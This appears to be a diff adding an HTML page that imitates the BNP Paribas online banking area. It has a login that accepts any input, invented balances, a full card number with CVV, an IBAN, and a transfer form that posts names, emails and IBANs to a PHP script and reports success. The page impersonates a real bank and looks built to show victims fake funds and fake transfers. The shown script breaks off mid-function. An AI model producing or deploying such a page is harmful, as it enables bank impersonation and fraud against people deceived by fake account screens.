@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="theme-color" content="#008f45">
+<title>BNP Paribas — Espace Client</title>
+
+<style>
+:root{
+ --green:#008f45;--green2:#006f36;--light:#f3f5f4;--dark:#17231d;
+ --muted:#6b756f;--white:#fff;--red:#d71920;--border:#e3e7e5;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{min-height:100%;font-family:Arial,Helvetica,sans-serif;background:var(--light);color:var(--dark)}
+button,input,select{font:inherit}
+button{cursor:pointer}
+.hidden{display:none!important}
+
+/* LOGIN */
+.login-page{
+ min-height:100vh;background:linear-gradient(135deg,#00783a,#39b967);
+ display:flex;align-items:center;justify-content:center;padding:20px;
+}
+.login-box{
+ width:100%;max-width:410px;background:#fff;border-radius:20px;padding:32px;
+ box-shadow:0 18px 50px #0003;
+}
+.login-logo{text-align:center;color:var(--green);font-size:34px;font-weight:800;margin-bottom:8px}
+.login-sub{text-align:center;color:var(--muted);margin-bottom:25px}
+.label{display:block;font-size:13px;font-weight:bold;margin:14px 0 6px}
+.input{
+ width:100%;padding:14px 15px;border:1px solid #d8dedb;border-radius:10px;
+ outline:none;background:#fff;
+}
+.input:focus{border-color:var(--green);box-shadow:0 0 0 3px #008f4515}
+.btn{
+ width:100%;padding:14px 16px;border:0;border-radius:10px;background:var(--green);
+ color:#fff;font-weight:700;margin-top:15px;transition:.2s;
+}
+.btn:hover{background:var(--green2);transform:translateY(-1px)}
+.login-links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px;color:var(--green)}
+.demo-note{font-size:11px;color:#777;text-align:center;margin-top:20px}
+
+/* APP HEADER */
+#application{display:none;min-height:100vh}
+.header{
+ position:sticky;top:0;z-index:30;background:var(--green);color:#fff;
+ padding:15px 18px;display:flex;justify-content:space-between;align-items:center;
+ box-shadow:0 2px 10px #0002;
+}
+.logo{font-size:21px;font-weight:800}
+.header-actions{display:flex;gap:14px;font-size:20px}
+.icon-btn{border:0;background:transparent;color:#fff;font-size:20px}
+.top-menu{
+ background:var(--green);color:#fff;display:flex;justify-content:center;gap:8px;
+ padding:0 8px 14px;overflow-x:auto;white-space:nowrap;
+}
+.top-menu button{
+ border:0;background:transparent;color:#fff;padding:9px 13px;border-radius:20px;
+ font-size:13px;font-weight:700;
+}
+.top-menu button.active,.top-menu button:hover{background:#fff;color:var(--green)}
+
+.container{max-width:760px;margin:auto;padding:15px 15px 95px}
+.page{display:none;animation:pageIn .3s ease}
+.page.active{display:block}
+@keyframes pageIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+.card{
+ background:#fff;border:1px solid var(--border);border-radius:16px;padding:18px;
+ margin-bottom:15px;box-shadow:0 3px 12px #0000000c;
+}
+.card h2{font-size:19px;margin-bottom:12px}
+.card h3{font-size:16px;margin-bottom:8px}
+.muted{color:var(--muted);font-size:13px}
+.row{display:flex;justify-content:space-between;gap:12px;align-items:center}
+.profile{display:flex;align-items:center;gap:13px}
+.avatar{
+ width:52px;height:52px;border-radius:50%;background:#dff3e7;color:var(--green);
+ display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px;
+ background-image:url('photo.jpg');background-size:cover;background-position:center;
+ background-color:#dff3e7;object-fit:cover;
+}
+.balance{font-size:31px;font-weight:800;color:var(--green);margin:7px 0}
+.balance.red{color:var(--red)}
+.account-number{font-size:13px;color:var(--muted)}
+.badge{display:inline-block;padding:6px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.badge.green{background:#e1f5e8;color:#087b39}
+.badge.red{background:#fde5e6;color:#b10d13}
+.badge.gray{background:#edf0ee;color:#5d6761}
+
+/* CARTE */
+.bank-card{
+ height:220px;border-radius:22px;padding:32px;color:#fff;position:relative;overflow:hidden;
+ background:linear-gradient(135deg,#00a84f 0%,#008040 50%,#005a2d 100%);
+ box-shadow:0 16px 40px #00000033;font-family:'Courier New',monospace;
+ letter-spacing:0.5px;
+}
+.bank-card:before{
+ content:"";position:absolute;top:-40%;right:-10%;width:400px;height:400px;
+ background:radial-gradient(circle,rgba(255,255,255,0.1),transparent);
+ border-radius:50%;
+}
+.bank-card:after{
+ content:"";position:absolute;bottom:-30%;left:-20%;width:350px;height:350px;
+ background:radial-gradient(circle,rgba(255,255,255,0.08),transparent);
+ border-radius:50%;
+}
+.chip{
+ width:56px;height:44px;border-radius:8px;background:linear-gradient(135deg,#ffd700 0%,#ffed4e 50%,#daa520 100%);
+ position:relative;z-index:2;box-shadow:0 4px 10px #00000044,inset -1px -1px 3px #00000033,inset 1px 1px 3px #ffffff44;
+}
+.chip:after{
+ content:"";position:absolute;left:24px;top:0;height:44px;width:8px;
+ background:linear-gradient(90deg,#b8860b,#ffd700);
+ box-shadow:inset 0 1px 2px #ffffff33;
+}
+.card-type{
+ position:absolute;top:32px;right:32px;font-size:32px;font-weight:bold;
+ opacity:0.85;letter-spacing:3px;text-shadow:0 2px 4px #00000044;
+ font-family:Arial,sans-serif;
+}
+.card-number{
+ font-size:24px;letter-spacing:4px;margin-top:32px;position:relative;z-index:2;
+ font-weight:600;text-shadow:0 2px 4px #00000033;
+}
+.card-number-hidden{
+ display:none;
+}
+.card-hidden .card-number-hidden{
+ display:block;
+}
+.card-hidden .card-number-visible{
+ display:none;
+}
+.card-details{
+ display:grid;grid-template-columns:1fr 1fr;gap:50px;margin-top:28px;position:relative;z-index:2;
+}
+.card-expiry{
+ font-size:10px;color:#ffffffe6;opacity:0.8;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;
+}
+.card-expiry-value{
+ font-size:18px;letter-spacing:2px;font-weight:600;font-family:'Courier New',monospace;
+}
+.card-cvv{
+ font-size:10px;color:#ffffffe6;opacity:0.8;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px;
+}
+.card-cvv-value{
+ font-size:18px;letter-spacing:2px;font-weight:600;font-family:'Courier New',monospace;
+}
+.card-cvv-value-masked{
+ display:block;
+}
+.card-cvv-value-visible{
+ display:none;
+}
+.card-hidden .card-cvv-value-masked{
+ display:none;
+}
+.card-hidden .card-cvv-value-visible{
+ display:block;
+}
+.card-bottom{
+ display:flex;justify-content:space-between;align-items:center;margin-top:24px;position:absolute;bottom:32px;left:32px;right:32px;z-index:2;
+ font-size:13px;font-weight:500;letter-spacing:0.5px;
+}
+.card-eye-toggle{
+ position:absolute;bottom:28px;right:28px;z-index:10;background:rgba(255,255,255,0.15);
+ border:1px solid rgba(255,255,255,0.25);color:#fff;font-size:14px;cursor:pointer;padding:6px 8px;
+ border-radius:6px;transition:all .25s;width:auto;height:auto;display:inline-flex;align-items:center;justify-content:center;
+}
+.card-eye-toggle:hover{
+ background:rgba(255,255,255,0.25);border-color:rgba(255,255,255,0.4);
+}
+
+/* QUICK ACTIONS */
+.actions{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:15px}
+.action{
+ background:#fff;border:1px solid var(--border);border-radius:13px;padding:14px 6px;
+ text-align:center;font-size:12px;transition:.2s;cursor:pointer;
+}
+.action:hover{transform:translateY(-3px);box-shadow:0 7px 18px #0001;color:var(--green)}
+.action .ico{font-size:22px;display:block;margin-bottom:6px}
+
+/* ACCOUNTS */
+.account-item{padding:15px 0;border-bottom:1px solid var(--border)}
+.account-item:last-child{border-bottom:0;padding-bottom:0}
+.account-item:first-child{padding-top:0}
+.account-type{font-weight:700}
+.amount{font-weight:800;color:var(--green)}
+.amount.negative{color:var(--red)}
+.progress{height:10px;background:#e3e7e5;border-radius:20px;overflow:hidden;margin:12px 0 5px}
+.progress-bar{height:100%;background:var(--green);border-radius:20px}
+
+/* TABLE */
+.table-wrap{overflow:auto}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th,td{text-align:left;padding:12px 8px;border-bottom:1px solid var(--border);white-space:nowrap}
+th{font-size:11px;color:var(--muted);text-transform:uppercase}
+td:last-child{text-align:right}
+
+/* RIB */
+.rib div{display:flex;justify-content:space-between;gap:15px;padding:12px 0;border-bottom:1px solid var(--border);font-size:13px}
+.rib div:last-child{border-bottom:0}
+.rib b{color:var(--muted);font-weight:500}
+.copy{border:0;background:#e9f6ee;color:var(--green);padding:8px 10px;border-radius:8px;font-size:12px}
+
+/* GRID */
+.grid2{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.stat{background:#f7f9f8;border-radius:12px;padding:15px}
+.stat strong{font-size:20px}
+
+/* FORMS */
+.form-group{margin-bottom:13px}
+.form-group label{display:block;font-size:12px;font-weight:700;margin-bottom:6px}
+select.input{background:#fff}
+.notice{padding:13px;border-radius:10px;background:#fff8e1;border-left:4px solid #e4aa00;font-size:13px}
+.success{padding:13px;border-radius:10px;background:#e6f7ed;color:#086d35;font-size:13px}
+
+/* NOTIFICATIONS */
+.notification{
+ position:fixed;top:75px;right:15px;z-index:100;background:#fff;border-left:4px solid var(--green);
+ border-radius:10px;padding:13px 15px;box-shadow:0 8px 30px #0002;max-width:320px;
+ animation:toast .3s ease;
+}
+@keyframes toast{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:none}}
+
+/* MODAL / LOADER */
+.loader{
+ position:fixed;inset:0;background:#fff;z-index:200;display:flex;align-items:center;justify-content:center;
+ flex-direction:column;gap:15px;
+}
+.loader-circle{width:55px;height:55px;border:6px solid #ddd;border-top-color:var(--green);border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.modal{
+ display:none;position:fixed;inset:0;background:#0007;z-index:150;align-items:center;justify-content:center;padding:20px;
+}
+.modal.show{display:flex}
+.modal-box{background:#fff;width:100%;max-width:430px;border-radius:16px;padding:22px}
+.modal-close{float:right;border:0;background:transparent;font-size:22px}
+
+/* BOTTOM NAV */
+.bottom-nav{
+ position:fixed;z-index:50;bottom:0;left:0;right:0;background:#fff;display:flex;
+ justify-content:center;box-shadow:0 -3px 14px #0002;padding:9px 3px;
+}
+.bottom-nav button{
+ flex:1;max-width:150px;border:0;background:transparent;color:#555;font-size:11px;
+ padding:5px 2px;
+}
+.bottom-nav button.active{color:var(--green);font-weight:700}
+.bottom-nav .navico{display:block;font-size:20px;margin-bottom:3px}
+
+/* MOBILE */
+@media(max-width:600px){
+ .login-box{padding:25px}
+ .top-menu{justify-content:flex-start}
+ .container{padding:10px 10px 88px}
+ .card{padding:15px;border-radius:15px}
+ .balance{font-size:27px}
+ .bank-card{height:175px;padding:20px}
+ .card-number{font-size:17px;margin-top:27px}
+ .actions{grid-template-columns:repeat(4,1fr);gap:7px}
+ .action{padding:12px 3px;font-size:10px}
+ .action .ico{font-size:19px}
+ .grid2{grid-template-columns:1fr}
+ .rib div{align-items:center}
+}
+@media(min-width:900px){
+ .container{max-width:850px}
+}
+</style>
+</head>
+
+<body>
+
+<!-- CONNEXION  -->
+<div class="login-page" id="login">
+ <div class="login-box">
+  <div class="login-logo"><img src="BNP.png" alt="BNP Logo" style="height:50px"></div>
+  <p class="login-sub">Espace client </p>
+
+  <label class="label">Identifiant client</label>
+  <input class="input" id="loginId" placeholder="Ex. 12345678">
+
+  <label class="label">Code secret</label>
+  <input class="input" id="loginCode" type="password" maxlength="6" placeholder="••••••">
+
+  <button class="btn" onclick="connexion()">Se connecter</button>
+
+  <div class="login-links">
+   <span onclick="toast('Fonction de démonstration')">Identifiant oublié ?</span>
+   <span onclick="toast('Aide à la connexion')">Besoin d'aide ?</span>
+  </div>
+
+  <p class="demo-note"></p>
+ </div>
+</div>
+
+<!-- APPLICATION -->
+<div id="application">
+
+ <header class="header">
+  <div class="logo"><img src="BNP.png" alt="BNP Logo" style="height:50px"></div>
+  <div class="header-actions">
+   <button class="icon-btn" onclick="openNotifications()">🔔</button>
+   <button class="icon-btn" onclick="page('settings')">⚙️</button>
+  </div>
+ </header>
+
+ <nav class="top-menu">
+  <button data-page="home" onclick="page('home')">Comptes</button>
+  <button data-page="credit" onclick="page('credit')">Emprunter</button>
+  <button data-page="save" onclick="page('save')">Épargner</button>
+  <button data-page="secure" onclick="page('secure')">Assurer</button>
+ </nav>
+
+ <main class="container">
+
+  <!-- ACCUEIL -->
+  <section id="home" class="page active">
+
+   <div class="card profile">
+    <div class="avatar"></div>
+    <div>
+     <b>FRANÇOIS GARCIA JOSE GONZÁLEZ</b>
+</b>
+     <div class="muted">Client Premium · Dernière connexion aujourd'hui</div>
+    </div>
+   </div>
+
+   <div class="card">
+    <div class="row">
+     <div>
+      <h3>Compte courant</h3>
+      <span class="account-number">N° **** **** 2020</span>
+     </div>
+     <span class="badge green">ACTIF</span>
+    </div>
+    <div class="balance">80 000,00 €</div>
+    <div class="muted">Solde disponible</div>
+   </div>
+
+   <div class="actions">
+    <div class="action" onclick="page('transfer')"><span class="ico">↔️</span>Virement</div>
+    <div class="action" onclick="page('cards')"><span class="ico">💳</span>Cartes</div>
+    <div class="action" onclick="page('documents')"><span class="ico">📄</span>Documents</div>
+    <div class="action" onclick="page('contact')"><span class="ico">💬</span>Contact</div>
+   </div>
+
+   <div class="card">
+    <div class="row"><h2>Ma carte</h2><span class="badge green">ACTIVE</span></div>
+    <div class="bank-card card-hidden" id="mainCard">
+     <div class="card-type">VISA</div>
+     <div class="chip"></div>
+     <div class="card-number card-number-visible">4532 1234 5678 6738</div>
+     <div class="card-number card-number-hidden">4532 •••• •••• 6738</div>
+     <div class="card-details">
+      <div>
+       <div class="card-expiry">Valid Thru</div>
+       <div class="card-expiry-value">12/27</div>
+      </div>
+      <div>
+       <div class="card-cvv">CVV</div>
+       <div class="card-cvv-value">
+        <span class="card-cvv-value-masked">•••</span>
+        <span class="card-cvv-value-visible">965</span>
+       </div>
+      </div>
+     </div>
+     <div class="card-bottom">
+      <span>FRANÇOIS GARCIA</span>
+      <button class="card-eye-toggle" onclick="toggleCardVisibility('mainCard')">👁</button>
+     </div>
+    </div>
+    <div class="row"><h2>Mes comptes</h2><button class="copy" onclick="page('accounts')">Voir tout</button></div>
+    <div class="account-item">
+     <div class="row"><span class="account-type">Compte courant</span><span class="amount">80 000 €</span></div>
+     <div class="muted">**** 2020</div>
+    </div>
+    <div class="account-item">
+     <div class="row"><span class="account-type">Épargne</span><span class="amount">25 000 €</span></div>
+     <div class="muted">Projet immobilier</div>
+    </div>
+    <div class="account-item">
+     <div class="row"><span class="account-type">Compte sécurisé</span><span class="amount negative">80 000 €</span></div>
+     <div class="muted">Statut actif — simulation uniquement</div>
+    </div>
+   </div>
+
+   <div class="card">
+    <div class="row"><h2>Dernières opérations</h2><button class="copy" onclick="page('operations')">Tout voir</button></div>
+    <div class="table-wrap">
+     <table>
+      <thead><tr><th>Opération</th><th>Date</th><th>Montant</th></tr></thead>
+      <tbody>
+       <tr><td>Salaire</td><td>08/09/2026</td><td class="amount">+78 555 €</td></tr>
+       <tr><td>Paiement carte</td><td>07/09/2026</td><td class="amount negative">-80 €</td></tr>
+       <tr><td>Retrait distributeur</td><td>06/09/2026</td><td class="amount negative">-50 €</td></tr>
+       <tr><td>Virement reçu</td><td>05/09/2026</td><td class="amount">+600 €</td></tr>
+      </tbody>
+     </table>
+    </div>
+   </div>
+
+   <div class="card">
+    <div class="row"><h2>RIB</h2><button class="copy" onclick="copyRIB()">Copier</button></div>
+    <div class="rib">
+     <div><b>Titulaire</b><span>FRANÇOIS GARCIA JOSE GONZÁLEZ
+</span></div>
+     <div><b>IBAN</b><span>BE40 3575 6521 6695 2615 2020</span></div>
+     <div><b>BIC</b><span>GEBABEBB</span></div>
+     <div><b>Banque</b><span>MONTAGE DU PARC 3, BRUXELLES, BELGIQUE </span></div>
+    </div>
+   </div>
+
+  </section>
+
+  <!-- COMPTES -->
+  <section id="accounts" class="page">
+   <div class="card">
+    <h2>Mes comptes</h2>
+    <div class="account-item">
+     <div class="row"><b>Compte courant</b><b class="amount">80 000 €</b></div>
+     <p class="muted">Compte **** 2020 · Disponible</p>
+    </div>
+    <div class="account-item">
+     <div class="row"><b>Compte épargne</b><b class="amount">25 000 €</b></div>
+     <p class="muted">Objectif : Projet immobilier</p>
+     <div class="progress"><div class="progress-bar" style="width:70%"></div></div>
+     <small class="muted">70 % de l'objectif</small>
+    </div>
+    <div class="account-item">
+     <div class="row"><b>Compte sécurisé</b><b class="amount negative">80 000 €</b></div>
+     <p class="muted">Compte  · statut actif</p>
+     <span class="badge green">ACTIF</span>
+    </div>
+   </div>
+   <div class="card">
+    <h2>Détails du compte courant</h2>
+    <div class="grid2">
+     <div class="stat"><span class="muted">Solde</span><br><strong>80 000 €</strong></div>
+     <div class="stat"><span class="muted">Disponible</span><br><strong>80 000 €</strong></div>
+     <div class="stat"><span class="muted">Découvert autorisé</span><br><strong>500 €</strong></div>
+     <div class="stat"><span class="muted">Dernier relevé</span><br><strong>08/09</strong></div>
+    </div>
+   </div>
+  </section>
+
+  <!-- OPERATIONS -->
+  <section id="operations" class="page">
+   <div class="card">
+    <h2>Historique des opérations</h2>
+    <div class="form-group"><input class="input" placeholder="🔎 Rechercher une opération"></div>
+    <div class="table-wrap">
+     <table>
+      <thead><tr><th>Libellé</th><th>Date</th><th>Montant</th></tr></thead>
+      <tbody>
+       <tr><td>Salaire</td><td>08/09/2026</td><td class="amount">+78 555 €</td></tr>
+       <tr><td>Paiement carte</td><td>07/09/2026</td><td class="amount negative">-80 €</td></tr>
+       <tr><td>Retrait DAB</td><td>06/09/2026</td><td class="amount negative">-50 €</td></tr>
+       <tr><td>Virement reçu</td><td>05/09/2026</td><td class="amount">+600 €</td></tr>
+       <tr><td>Abonnement</td><td>03/09/2026</td><td class="amount negative">-25 €</td></tr>
+       <tr><td>Virement reçu</td><td>01/09/2026</td><td class="amount">+1 000 €</td></tr>
+      </tbody>
+     </table>
+    </div>
+   </div>
+  </section>
+
+  <!-- VIREMENTS -->
+  <section id="transfer" class="page">
+   <div class="card">
+    <h2>Effectuer un virement</h2>
+    <p class="muted">Simulation sans transfert d'argent réel.</p>
+    <div class="form-group"><label>Votre email</label><input class="input" id="senderEmail" placeholder="Votre email"></div>
+    <div class="form-group"><label>Votre nom et prénom</label><input class="input" id="beneficiaryFirstName" placeholder="Prénom du bénéficiaire"></div>
+    <div class="form-group"><label>Bénéficiaire</label><input class="input" id="beneficiary" placeholder="Nom du bénéficiaire"></div>
+    <div class="form-group"><label>Email bénéficiaire</label><input class="input" id="beneficiaryEmail" placeholder="Email du bénéficiaire"></div>
+    <div class="form-group"><label>IBAN</label><input class="input" id="iban" placeholder="BE40 XXXX XXXX XXXX"></div>
+    <div class="form-group"><label>Montant</label><input class="input" id="transferAmount" type="number" placeholder="0"></div>
+    <div class="form-group"><label>Motif</label><input class="input" id="transferMotive" placeholder="Motif du virement"></div>
+    <button class="btn" onclick="prepareTransfer()">Continuer</button>
+   </div>
+   <div class="card">
+    <h2>Bénéficiaires</h2>
+    <div class="account-item"><b>Marie Martin</b><div class="muted">BE40 XXXX XXXX 1001</div></div>
+    <div class="account-item"><b>BNP Services</b><div class="muted">BE40 XXXX XXXX 2002</div></div>
+   </div>
+  </section>
+
+  <!-- CARTES -->
+  <section id="cards" class="page">
+   <div class="card">
+    <div class="row"><h2>Ma carte principale</h2><span class="badge green">ACTIVE</span></div>
+    <div class="bank-card card-hidden" id="cardDetails">
+     <div class="card-type">VISA</div>
+     <div class="chip"></div>
+     <div class="card-number card-number-visible">4532 1234 5678 6738</div>
+     <div class="card-number card-number-hidden">4532 •••• •••• 6738</div>
+     <div class="card-details">
+      <div>
+       <div class="card-expiry">Valid Thru</div>
+       <div class="card-expiry-value">12/27</div>
+      </div>
+      <div>
+       <div class="card-cvv">CVV</div>
+       <div class="card-cvv-value">
+        <span class="card-cvv-value-masked">•••</span>
+        <span class="card-cvv-value-visible">965</span>
+       </div>
+      </div>
+     </div>
+     <div class="card-bottom">
+      <span>FRANÇOIS GARCIA</span>
+      <button class="card-eye-toggle" onclick="toggleCardVisibility('cardDetails')">👁</button>
+     </div>
+    </div>
+    <div class="grid2">
+     <button class="copy" onclick="toast('Gestion de la carte')">🔐 Sécurité</button>
+     <button class="copy" onclick="toast('Plafond  : 78 555 €')">📊 Plafonds</button>
+     <button class="copy" onclick="toast('Paiements en ligne activés')">🌐 Paiement en ligne</button>
+     <button class="copy" onclick="toast('Paiement mobile activé')">📱 Paiement mobile</button>
+    </div>
+   </div>
+   <div class="card">
+    <h2>Autres cartes</h2>
+    <div class="account-item"><b>BNP Visa Épargne</b><span class="badge green">ACTIVE</span></div>
+    <div class="account-item"><b>Carte virtuelle</b><span class="badge gray">INACTIVE</span></div>
+   </div>
+  </section>
+
+  <!-- CREDIT -->
+  <section id="credit" class="page">
+   <div class="card">
+    <h2>Emprunter</h2>
+    <p class="muted">Solutions de financement s.</p>
+   </div>
+   <div class="card">
+    <h3>Crédit personnel</h3>
+    <div class="grid2">
+     <div class="stat"><span class="muted">Capital restant</span><br><strong>8 400 €</strong></div>
+     <div class="stat"><span class="muted">Mensualité</span><br><strong>350 €</strong></div>
+     <div class="stat"><span class="muted">Durée restante</span><br><strong>24 mois</strong></div>
+     <div class="stat"><span class="muted">Échéance</span><br><strong>05/10/2026</strong></div>
+    </div>
+   </div>
+   <div class="card">
+    <h2>Simuler un crédit</h2>
+    <div class="form-group"><label>Montant souhaité</label><input class="input" id="loanAmount" type="number" placeholder="10000"></div>
+    <div class="form-group"><label>Durée</label><select class="input" id="loanDuration"><option>12 mois</option><option>24 mois</option><option>36 mois</option><option>48 mois</option></select></div>
+    <button class="btn" onclick="simulateLoan()">Simuler</button>
+    <div id="loanResult" style="margin-top:12px"></div>
+   </div>
+  </section>
+
+  <!-- EPARGNE -->
+  <section id="save" class="page">
+   <div class="card">
+    <h2>Épargne</h2>
+    <div class="balance">25 000 €</div>
+    <p class="muted">Total épargne </p>
+   </div>
+   <div class="card">
+    <h3>Objectif : Projet immobilier</h3>
+    <div class="row"><span>15 000 € / 30 000 €</span><b>50 %</b></div>
+    <div class="progress"><div class="progress-bar" style="width:50%"></div></div>
+   </div>
+   <div class="card">
+    <h3>Épargne de précaution</h3>
+    <div class="row"><span>10 000 € / 12 000 €</span><b>83 %</b></div>
+    <div class="progress"><div class="progress-bar" style="width:83%"></div></div>
+   </div>
+  </section>
+
+  <!-- ASSURANCE -->
+  <section id="secure" class="page">
+   <div class="card"><h2>Assurances</h2><p class="muted">Contrats de démonstration.</p></div>
+   <div class="card"><div class="row"><b>🏠 Assurance habitation</b><span class="badge green">ACTIVE</span></div><p class="muted" style="margin-top:8px">Contrat n° DEMO-001 · Échéance 12/2026</p></div>
+   <div class="card"><div class="row"><b>🚗 Assurance automobile</b><span class="badge green">ACTIVE</span></div><p class="muted" style="margin-top:8px">Contrat n° DEMO-002 · Échéance 03/2027</p></div>
+   <div class="card"><div class="row"><b>🛡 Protection famille</b><span class="badge green">ACTIVE</span></div><p class="muted" style="margin-top:8px">Contrat n° DEMO-003</p></div>
+  </section>
+
+  <!-- DOCUMENTS -->
+  <section id="documents" class="page">
+   <div class="card">
+    <h2>Documents</h2>
+    <div class="account-item"><div class="row"><b>📄 Relevé bancaire — Septembre</b><button class="copy" onclick="toast('Aperçu du document ')">Ouvrir</button></div></div>
+    <div class="account-item"><div class="row"><b>📄 Relevé bancaire — Août</b><button class="copy" onclick="toast('Aperçu du document ')">Ouvrir</button></div></div>
+    <div class="account-item"><div class="row"><b>📄 RIB</b><button class="copy" onclick="copyRIB()">Copier</button></div></div>
+    <div class="account-item"><div class="row"><b>📄 Contrat carte</b><button class="copy" onclick="toast('Document ')">Ouvrir</button></div></div>
+   </div>
+  </section>
+
+  <!-- CONTACT -->
+  <section id="contact" class="page">
+   <div class="card">
+    <h2>Contact & assistance</h2>
+    <div class="account-item"><b>💬 Messagerie</b><p class="muted">Écrire à un conseiller </p></div>
+    <div class="account-item"><b>☎️ Service client</b><p class="muted">+34 00 00 00 00 00 — démonstration</p></div>
+    <div class="account-item"><b>📍 Agences</b><p class="muted">Rechercher une agence </p></div>
+   </div>
+  </section>
+
+  <!-- NOTIFICATIONS -->
+  <section id="notifications" class="page">
+   <div class="card">
+    <h2>Notifications</h2>
+    <div class="notification" style="position:static;margin-bottom:10px">Nouvelle opération enregistrée sur votre compte .</div>
+    <div class="notification" style="position:static">Votre carte  est active et fonctionnelle.</div>
+   </div>
+  </section>
+
+  <!-- PARAMETRES -->
+  <section id="settings" class="page">
+   <div class="card">
+    <h2>Paramètres</h2>
+    <div class="account-item"><b>👤 Informations personnelles</b><p class="muted">FRANÇOIS GARCIA JOSE GONZÁLEZ
+</p></div>
+    <div class="account-item"><b>🔐 Sécurité</b><p class="muted">Modifier le code secret </p></div>
+    <div class="account-item"><b>🔔 Notifications</b><p class="muted">Gérer les préférences</p></div>
+    <div class="account-item"><b>🌙 Apparence</b><p class="muted">Mode clair</p></div>
+    <button class="btn" onclick="logout()">Se déconnecter</button>
+   </div>
+  </section>
+
+ </main>
+
+ <!-- NAVIGATION BAS -->
+ <nav class="bottom-nav">
+  <button data-page="home" onclick="page('home')"><span class="navico">🏠</span>Accueil</button>
+  <button data-page="transfer" onclick="page('transfer')"><span class="navico">↔️</span>Virements</button>
+  <button data-page="cards" onclick="page('cards')"><span class="navico">💳</span>Cartes</button>
+  <button data-page="contact" onclick="page('contact')"><span class="navico">💬</span>Contact</button>
+  <button data-page="settings" onclick="page('settings')"><span class="navico">☰</span>Plus</button>
+ </nav>
+</div>
+
+<!-- MODAL NOTIFICATIONS -->
+<div class="modal" id="notifModal" onclick="if(event.target===this)closeModal()">
+ <div class="modal-box">
+  <button class="modal-close" onclick="closeModal()">×</button>
+  <h2>Notifications</h2>
+  <p style="margin-top:12px">🔔 Votre compte  a été mis à jour.</p>
+  <p style="margin-top:12px">💳 Votre carte  fonctionne correctement.</p>
+  <button class="btn" onclick="closeModal()">Fermer</button>
+ </div>
+</div>
+
+<!-- MODAL TRANSFER RECEIPT -->
+<div class="modal" id="transferReceiptModal" onclick="if(event.target===this)closeTransferModal()">
+ <div class="modal-box" style="max-width:650px">
+  <button class="modal-close" onclick="closeTransferModal()">×</button>
+  <div id="transferReceiptContent"></div>
+ </div>
+</div>
+
+<script>
+const pages=document.querySelectorAll('.page');
+const navButtons=document.querySelectorAll('[data-page]');
+
+function connexion(){
+ const loader=document.createElement('div');
+ loader.className='loader';
+ loader.innerHTML='<div class="login-logo"><img src="BNP.png" alt="BNP Logo" style="height:40px"></div><div class="loader-circle"></div><span>Connexion en cours...</span>';
+ document.body.appendChild(loader);
+ setTimeout(()=>{
+  document.getElementById('login').style.display='none';
+  document.getElementById('application').style.display='block';
+  loader.remove();
+  page('home');
+ },900);
+}
+
+function page(id){
+ pages.forEach(p=>p.classList.remove('active'));
+ const target=document.getElementById(id);
+ if(target) target.classList.add('active');
+ navButtons.forEach(b=>b.classList.toggle('active',b.dataset.page===id));
+ window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function toast(message){
+ const old=document.querySelector('.notification.toast');
+ if(old) old.remove();
+ const el=document.createElement('div');
+ el.className='notification toast';
+ el.innerHTML='<b>BNP Paribas</b><br>'+message;
+ document.body.appendChild(el);
+ setTimeout(()=>el.remove(),2800);
+}
+
+function openNotifications(){
+ document.getElementById('notifModal').classList.add('show');
+}
+
+function closeModal(){
+ document.getElementById('notifModal').classList.remove('show');
+}
+
+function copyRIB(){
+ const text='IBAN BE40 3575 6521 6695 2615 2020 — BIC GEBABEBB';
+ if(navigator.clipboard){
+  navigator.clipboard.writeText(text).then(()=>toast('RIB  copié'));
+ }else toast('RIB  : '+text);
+}
+
+function toggleCardVisibility(cardId){
+ const card=document.getElementById(cardId);
+ card.classList.toggle('card-hidden');
+}
+
+function closeTransferModal(){
+ document.getElementById('transferReceiptModal').classList.remove('show');
+}
+
+function prepareTransfer(){
+ const senderEmail=document.getElementById('senderEmail').value.trim();
+ const beneficiaryFirstName=document.getElementById('beneficiaryFirstName').value.trim();
+ const beneficiary=document.getElementById('beneficiary').value.trim();
+ const beneficiaryEmail=document.getElementById('beneficiaryEmail').value.trim();
+ const iban=document.getElementById('iban').value.trim();
+ const amount=document.getElementById('transferAmount').value;
+ const motive=document.getElementById('transferMotive').value.trim();
+ 
+ if(!senderEmail||!beneficiaryFirstName||!beneficiary||!beneficiaryEmail||!iban||!amount||!motive){
+  toast('Veuillez remplir tous les champs.');
+  return;
+ }
+ 
+ // Créer FormData pour l'envoi AJAX
+ const formData=new FormData();
+ formData.append('senderEmail',senderEmail);
+ formData.append('beneficiaryFirstName',beneficiaryFirstName);
+ formData.append('beneficiary',beneficiary);
+ formData.append('beneficiaryEmail',beneficiaryEmail);
+ formData.append('iban',iban);
+ formData.append('amount',amount);
+ formData.append('motive',motive);
+ 
+ // Envoyer la requête au serveur PHP
+ fetch('send-transfer.php',{
+  method:'POST',
+  body:formData
+ })
+ .then(response=>response.json())
+ .then(data=>{
+  if(data.success){
+   // Vider les champs
+   document.getElementById('senderEmail').value='';
+   document.getElementById('beneficiaryFirstName').value='';
+   document.getElementById('beneficiary').value='';
+   document.getElementById('beneficiaryEmail').value='';
+   document.getElementById('iban').value='';
+   document.getElementById('transferAmount').value='';
+   document.getElementById('transferMotive').value='';
+   
+   // Afficher confirmation
+   toast('✓ Virement effectué avec succès');
+  }else{
+   toast('Erreur : '+data.message);
+  }
+ })
+ .catch(error=>{
+  console.error('Erreur:',error);
+  toast('Erreur de connexion au serveur');
+ });
+}
+
+function simulateLoan(){
+ const amount=Number(document.getElementById('loanAmount').value||0);
+ const duration=parseInt(document.getElementById('loanDuration').value);
+ if(!amount){toast('Entrez un montant de démonstration.');return}
+ const monthly=(amount/duration)*1.03;
+ document.getElementById('loanResult').innerHTML=
